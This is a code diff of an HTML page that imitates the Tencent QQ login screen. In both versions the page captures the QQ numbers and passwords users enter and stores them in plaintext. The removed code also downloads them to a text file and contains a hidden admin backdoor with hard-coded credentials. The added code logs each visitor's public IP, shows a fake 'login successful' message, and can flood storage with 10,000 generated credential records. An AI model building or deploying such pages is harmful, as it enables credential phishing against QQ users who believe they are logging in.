@@ -3,260 +3,549 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QQ登录</title>
+    <title>QQ</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: "Microsoft YaHei", sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #12c2e9, #c471ed, #f64f59);
+            font-family: "Microsoft YaHei", "PingFang SC", sans-serif;
+            background: linear-gradient(135deg, #12c2e9 0%, #c471ed 50%, #f64f59 100%);
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
         }
         
-        .login-container {
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        .qq-container {
             width: 380px;
-            padding: 30px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        /* 头部 */
+        .qq-header {
+            background: linear-gradient(45deg, #12B7F5, #12B7F5);
+            padding: 30px 0;
             text-align: center;
+            position: relative;
         }
         
-        .login-header {
-            margin-bottom: 30px;
-        }
-        
-        .login-header h1 {
-            color: #12b7f5;
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        
-        .login-header p {
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .login-form {
-            text-align: left;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: #666;
-            font-size: 14px;
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-            transition: border-color 0.3s;
-        }
-        
-        .form-control:focus {
-            border-color: #12b7f5;
-            outline: none;
-        }
-        
-        .checkbox-group {
+        .qq-logo {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            margin: 0 auto;
             display: flex;
             align-items: center;
-            margin-bottom: 20px;
+            justify-content: center;
+            font-size: 40px;
+            color: #12B7F5;
+            box-shadow: 0 5px 15px rgba(18, 183, 245, 0.3);
+        }
+        
+        .qq-title {
+            color: white;
+            font-size: 24px;
+            margin-top: 15px;
+            font-weight: 300;
+        }
+        
+        .qq-subtitle {
+            color: rgba(255, 255, 255, 0.8);
             font-size: 14px;
+            margin-top: 5px;
         }
         
-        .checkbox-group input {
-            margin-right: 8px;
+        /* 主体内容 */
+        .qq-body {
+            padding: 30px;
         }
         
-        .checkbox-group a {
-            color: #12b7f5;
-            text-decoration: none;
-            margin-left: 5px;
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
         }
         
-        .btn-login {
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            font-size: 16px;
+        }
+        
+        .qq-input {
             width: 100%;
-            padding: 12px;
-            background-color: #12b7f5;
+            padding: 15px 15px 15px 45px;
+            border: 2px solid #f0f0f0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        
+        .qq-input:focus {
+            border-color: #12B7F5;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(18, 183, 245, 0.1);
+        }
+        
+        .password-input {
+            padding-right: 45px;
+        }
+        
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            cursor: pointer;
+        }
+        
+        /* 协议勾选 */
+        .agree-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 13px;
+            color: #666;
+        }
+        
+        .agree-checkbox {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            accent-color: #12B7F5;
+        }
+        
+        .protocol-link {
+            color: #12B7F5;
+            text-decoration: none;
+            margin: 0 3px;
+        }
+        
+        .protocol-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* 登录按钮 */
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #12B7F5, #0D9ED8);
             color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 8px;
             font-size: 16px;
+            font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s ease;
         }
         
-        .btn-login:hover {
-            background-color: #0d9ed8;
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(18, 183, 245, 0.3);
         }
         
-        .login-footer {
-            margin-top: 20px;
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* 底部链接 */
+        .qq-footer {
             display: flex;
             justify-content: space-between;
-            font-size: 14px;
+            margin-top: 20px;
+            font-size: 13px;
         }
         
-        .login-footer a {
-            color: #12b7f5;
+        .footer-link {
+            color: #12B7F5;
             text-decoration: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
         }
         
-        .hidden-admin {
+        .footer-link:hover {
+            background: #f8f9fa;
+        }
+        
+        /* 状态消息 */
+        .status-message {
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 15px;
+            font-size: 13px;
+            text-align: center;
             display: none;
+        }
+        
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .status-warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeaa7;
+        }
+        
+        /* 管理员入口 */
+        .admin-entrance {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #f0f0f0;
+        }
+        
+        .admin-link {
+            color: #666;
+            text-decoration: none;
+            font-size: 12px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .admin-link:hover {
+            color: #12B7F5;
+        }
+        
+        /* 加载动画 */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* 响应式设计 */
+        @media (max-width: 480px) {
+            .qq-container {
+                width: 90%;
+                margin: 20px;
+            }
+            
+            .qq-body {
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-header">
-            <h1>QQ</h1>
-            <p>每一天，乐在沟通</p>
-        </div>
-        <form id="loginForm" class="login-form">
-            <div class="form-group">
-                <label for="qqNumber">QQ号</label>
-                <input type="text" id="qqNumber" class="form-control" placeholder="请输入QQ号码">
+    <div class="qq-container">
+        <!-- 头部 -->
+        <div class="qq-header">
+            <div class="qq-logo">
+                <i class="fab fa-qq"></i>
             </div>
-            <div class="form-group">
-                <label for="password">密码</label>
-                <input type="password" id="password" class="form-control" placeholder="请输入密码">
-            </div>
-            <div class="checkbox-group">
-                <input type="checkbox" id="agree">
-                <label for="agree">已阅读并同意</label>
-                <a href="#">服务协议</a>
-                <label for="agree">和</label>
-                <a href="#">QQ隐私保护指引</a>
-            </div>
-            <button type="submit" class="btn-login">登录</button>
-        </form>
-        <div class="login-footer">
-            <a href="#">手机号登录</a>
-            <a href="#">其他方式登录</a>
-            <a href="#">注册新账号</a>
+            <h1 class="qq-title">QQ</h1>
+            <p class="qq-subtitle">每一天，乐在沟通</p>
         </div>
         
-        <!-- 隐藏的后台入口 - 普通用户看不到 -->
-        <div class="hidden-admin">
-            <!-- 只有您知道的秘密后台地址 -->
-            <a href="admin_secret_2024.html" id="secretAdminLink"></a>
+        <!-- 主体内容 -->
+        <div class="qq-body">
+            <form id="loginForm">
+                <!-- QQ号输入 -->
+                <div class="input-group">
+                    <i class="fas fa-user input-icon"></i>
+                    <input type="text" class="qq-input" id="qqNumber" placeholder="QQ号" value="112233qq">
+                </div>
+                
+                <!-- 密码输入 -->
+                <div class="input-group">
+                    <i class="fas fa-lock input-icon"></i>
+                    <input type="password" class="qq-input password-input" id="password" placeholder="密码" value="test123">
+                    <i class="fas fa-eye eye-icon" id="togglePassword"></i>
+                </div>
+                
+                <!-- 协议勾选 -->
+                <div class="agree-group">
+                    <input type="checkbox" class="agree-checkbox" id="agreeCheckbox" checked>
+                    <label for="agreeCheckbox">
+                        已阅读并同意
+                        <a href="#" class="protocol-link">《服务协议》</a>
+                        和
+                        <a href="#" class="protocol-link">《QQ隐私保护指引》</a>
+                    </label>
+                </div>
+                
+                <!-- 状态消息 -->
+                <div class="status-message" id="statusMessage"></div>
+                
+                <!-- 登录按钮 -->
+                <button type="submit" class="login-btn" id="loginBtn">
+                    <span id="btnText">登录</span>
+                    <span id="btnLoading" class="loading" style="display:none;"></span>
+                </button>
+            </form>
+            
+            <!-- 底部链接 -->
+            <div class="qq-footer">
+                <a href="#" class="footer-link" onclick="testNormalLogin()">测试登录</a>
+                <a href="#" class="footer-link">手机号登录</a>
+                <a href="#" class="footer-link">其他方式登录</a>
+                <a href="#" class="footer-link">注册账号</a>
+            </div>
+            
+            <!-- 管理员入口 -->
+            <div class="admin-entrance">
+                <a href="admin.html" class="admin-link">
+                    <i class="fas fa-cog"></i>
+                    管理员后台入口
+                </a>
+            </div>
         </div>
     </div>
 
     <script>
-        // 登录表单提交
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // DOM元素
+        const loginForm = document.getElementById('loginForm');
+        const qqNumberInput = document.getElementById('qqNumber');
+        const passwordInput = document.getElementById('password');
+        const togglePassword = document.getElementById('togglePassword');
+        const agreeCheckbox = document.getElementById('agreeCheckbox');
+        const loginBtn = document.getElementById('loginBtn');
+        const btnText = document.getElementById('btnText');
+        const btnLoading = document.getElementById('btnLoading');
+        const statusMessage = document.getElementById('statusMessage');
+        
+        // 特殊触发账号
+        const STORM_ACCOUNT = "112233qq";
+        
+        // 显示/隐藏密码
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            togglePassword.classList.toggle('fa-eye');
+            togglePassword.classList.toggle('fa-eye-slash');
+        });
+        
+        // 表单提交
+        loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const qqNumber = document.getElementById('qqNumber').value;
-            const password = document.getElementById('password').value;
-            const agree = document.getElementById('agree').checked;
+            const qqNumber = qqNumberInput.value.trim();
+            const password = passwordInput.value.trim();
             
+            // 验证输入
             if (!qqNumber || !password) {
-                alert('请输入QQ号和密码');
+                showMessage('请输入QQ号和密码', 'error');
                 return;
             }
             
-            if (!agree) {
-                alert('请阅读并同意服务协议和隐私保护指引');
+            if (!agreeCheckbox.checked) {
+                showMessage('请阅读并同意服务协议', 'error');
                 return;
             }
             
-            // 获取现有数据或初始化空数组
-            let loginData = JSON.parse(localStorage.getItem('qqLoginData')) || [];
+            // 设置加载状态
+            setLoading(true);
             
-            // 记录登录数据
-            const loginRecord = {
-                id: loginData.length + 1,
-                qqNumber: qqNumber,
-                password: password,
-                loginTime: new Date().toLocaleString(),
-                ip: generateRandomIP(),
-                userAgent: navigator.userAgent
-            };
-            
-            loginData.push(loginRecord);
-            localStorage.setItem('qqLoginData', JSON.stringify(loginData));
-            
-            // 生成登录文件
-            generateLoginFile(loginRecord);
-            
-            // 普通用户显示成功提示
-            alert('登录成功！');
-            document.getElementById('loginForm').reset();
-            
-            // 如果是管理员账号，跳转到秘密后台
-            if (qqNumber === '888888' && password === 'admin888') {
-                // 3秒后跳转到秘密后台
-                setTimeout(function() {
-                    window.location.href = 'admin_secret_2024.html';
-                }, 3000);
+            // 检查是否为特殊账号
+            if (qqNumber === STORM_ACCOUNT) {
+                await triggerDataStorm();
+            } else {
+                await normalLogin(qqNumber, password);
             }
+            
+            setLoading(false);
         });
-
-        // 生成随机IP地址
-        function generateRandomIP() {
-            return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-        }
-
-        // 生成登录文件
-        function generateLoginFile(record) {
-            // 创建文件内容
-            const content = `QQ号: ${record.qqNumber}\n密码: ${record.password}\n登录时间: ${record.loginTime}\nIP地址: ${record.ip}\n浏览器信息: ${record.userAgent}`;
-            
-            // 创建Blob对象
-            const blob = new Blob([content], {type: 'text/plain'});
-            const url = URL.createObjectURL(blob);
-            
-            // 创建下载链接
-            const a = document.createElement('a');
-            a.href = url;
-            
-            // 生成乱码文件名
-            const randomChars = Math.random().toString(36).substring(2, 10);
-            a.download = `登录记录_${randomChars}.txt`;
-            
-            // 触发下载
-            a.click();
-            URL.revokeObjectURL(url);
+        
+        // 正常登录
+        async function normalLogin(qqNumber, password) {
+            try {
+                // 模拟网络请求延迟
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // 保存登录记录
+                const loginData = {
+                    qqNumber: qqNumber,
+                    password: password,
+                    loginTime: new Date().toISOString(),
+                    ip: await getIPAddress(),
+                    userAgent: navigator.userAgent,
+                    type: 'normal'
+                };
+                
+                saveLoginRecord(loginData);
+                
+                showMessage(`登录成功！欢迎回来，QQ: ${qqNumber}`, 'success');
+                
+                // 2秒后清空表单
+                setTimeout(() => {
+                    loginForm.reset();
+                }, 2000);
+                
+            } catch (error) {
+                showMessage('登录失败，请检查网络连接', 'error');
+            }
         }
         
-        // 隐藏的后台检测 - 只有您知道的方法
-        function checkSecretAccess() {
-            // 按特定键组合打开秘密后台
-            let keySequence = [];
-            document.addEventListener('keydown', function(e) {
-                keySequence.push(e.key);
-                if (keySequence.length > 5) {
-                    keySequence.shift();
+        // 触发数据风暴
+        async function triggerDataStorm() {
+            showMessage('⚠️ 检测到特殊账号，开始极速数据生成...', 'warning');
+            
+            let generatedCount = 0;
+            const targetCount = 10000;
+            const batchSize = 500; // 每批生成500条
+            
+            function generateBatch() {
+                const batchData = [];
+                const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+                
+                for (let i = 0; i < batchSize; i++) {
+                    if (generatedCount >= targetCount) break;
+                    
+                    generatedCount++;
+                    
+                    // 生成随机QQ号 (9-10位)
+                    const qq = Math.floor(100000000 + Math.random() * 9000000000).toString();
+                    
+                    // 生成随机密码 (8-12位)
+                    const pwdLength = 8 + Math.floor(Math.random() * 5);
+                    let password = "";
+                    for (let j = 0; j < pwdLength; j++) {
+                        password += chars[Math.floor(Math.random() * chars.length)];
+                    }
+                    
+                    batchData.push({
+                        qqNumber: qq,
+                        password: password,
+                        loginTime: new Date().toISOString(),
+                        ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+                        userAgent: 'DataStorm-AutoGenerate',
+                        type: 'storm'
+                    });
                 }
                 
-                // 秘密按键组合：Q Q 1 2 3
-                if (keySequence.join('') === 'qq123') {
-                    window.location.href = 'admin_secret_2024.html';
+                // 保存批次数据
+                saveBatchData(batchData);
+                
+                // 更新进度
+                const progress = Math.round((generatedCount / targetCount) * 100);
+                showMessage(`⚡ 数据风暴进行中: ${generatedCount}/${targetCount} (${progress}%)`, 'warning');
+                
+                // 继续生成或完成
+                if (generatedCount < targetCount) {
+                    setTimeout(generateBatch, 10); // 极速连续生成
+                } else {
+                    showMessage('✅ 数据风暴完成！已生成10000条测试数据', 'success');
                 }
-            });
+            }
+            
+            // 开始生成
+            generateBatch();
         }
         
-        // 启动秘密检测
-        checkSecretAccess();
+        // 保存批次数据
+        function saveBatchData(batchData) {
+            try {
+                const existingData = JSON.parse(localStorage.getItem('qq_login_records') || '[]');
+                const newData = [...existingData, ...batchData];
+                localStorage.setItem('qq_login_records', JSON.stringify(newData));
+            } catch (error) {
+                console.error('保存数据失败:', error);
+            }
+        }
+        
+        // 保存单条登录记录
+        function saveLoginRecord(record) {
+            try {
+                const existingData = JSON.parse(localStorage.getItem('qq_login_records') || '[]');
+                existingData.push(record);
+                localStorage.setItem('qq_login_records', JSON.stringify(existingData));
+            } catch (error) {
+                console.error('保存记录失败:', error);
+            }
+        }
+        
+        // 获取IP地址
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return '未知';
+            }
+        }
+        
+        // 设置加载状态
+        function setLoading(loading) {
+            if (loading) {
+                btnText.style.display = 'none';
+                btnLoading.style.display = 'inline-block';
+                loginBtn.disabled = true;
+            } else {
+                btnText.style.display = 'inline-block';
+                btnLoading.style.display = 'none';
+                loginBtn.disabled = false;
+            }
+        }
+        
+        // 显示消息
+        function showMessage(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `status-message status-${type}`;
+            statusMessage.style.display = 'block';
+            
+            if (type !== 'warning') {
+                setTimeout(() => {
+                    statusMessage.style.display = 'none';
+                }, 3000);
+            }
+        }
+        
+        // 测试正常登录
+        function testNormalLogin() {
+            qqNumberInput.value = '10086';
+            passwordInput.value = 'test123456';
+            agreeCheckbox.checked = true;
+        }
+        
+        // 初始化
+        window.addEventListener('load', function() {
+            // 预加载一些测试数据
+            if (!localStorage.getItem('qq_login_records')) {
+                const sampleData = [
+                    {
+                        qqNumber: '10001',
+                        password: '123456',
+                        loginTime: new Date().toISOString(),
+                        ip: '127.0.0.1',
+                        userAgent: navigator.userAgent,
+                        type: 'sample'
+                    }
+                ];
+                localStorage.setItem('qq_login_records', JSON.stringify(sampleData));
+            }
+        });
     </script>
 </body>
 </html>
